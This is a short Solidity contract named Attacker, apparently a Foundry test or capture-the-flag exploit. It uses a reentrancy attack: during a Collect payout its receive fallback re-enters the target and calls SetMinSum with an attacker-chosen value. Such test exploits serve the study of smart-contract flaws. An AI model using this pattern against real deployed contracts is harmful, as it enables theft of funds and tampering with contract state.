contract Attacker {
    C public target;
    uint public state;
    address player;
    uint newVal;
    uint attackAmt;

    constructor(C _target) { target = _target; }

    function attack(address _player, uint _val2) external payable {
        player = _player;
        newVal = _val2;
        attackAmt = msg.value / 2;
        state = 0;
        vm.prank(player);
        target.Collect(attackAmt);
    }

    receive() external payable {
        if (state == 0) {
            state = 1;
            vm.prank(address(this));
            target.SetMinSum(newVal);
        }
    }
}

